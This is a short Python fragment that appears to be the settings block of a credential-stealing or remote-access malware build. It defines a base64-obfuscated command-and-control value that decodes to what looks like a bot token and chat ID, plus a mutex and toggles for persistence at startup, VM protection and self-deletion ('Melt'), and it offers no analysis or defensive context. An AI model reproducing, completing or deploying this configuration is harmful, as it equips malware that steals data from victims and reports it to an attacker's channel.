...
class Settings:
    C2 = (1, base64.b64decode('NzA3MDMxNDkwNTpBQUhwVlJxTWxUZXVZY21jMjFXX05xbzJJOVpsQkJPS0dSQSQtNDI3ODUxNzg3Mg==').decode())
    Mutex = base64.b64decode('c2J0SzhKQ2xOZUJKekp2SA==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
